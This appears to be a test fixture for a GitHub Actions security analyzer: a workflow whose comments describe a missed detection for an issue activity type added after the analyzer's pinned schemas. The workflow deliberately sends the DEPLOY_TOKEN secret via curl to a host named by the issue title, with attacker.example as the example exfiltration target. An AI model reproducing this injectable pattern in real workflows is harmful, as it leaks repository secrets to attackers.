# situation: on issues of an activity type added_later, a step sends a
#   request with curl and the secret DEPLOY_TOKEN to the host the issue's
#   title names.
# reason: a todo (a pin update): an activity type GitHub added after the
#   pinned schemas is missed until the pins are updated.
# cause: the analysis drops a value of types it does not know, so the job
#   has no attacker's event.
# attack: the attacker opens an issue titled attacker.example, the host of a
#   server the attacker runs.
# attack-run-behavior: when GitHub sends issues with the activity type
#   added_later, curl sends the request with Authorization: Bearer and the
#   value of DEPLOY_TOKEN to attacker.example, and the server of the
#   attacker logs the header.
on: 
  issues:
    types: [added_later]
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    steps:
      - run: |
          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
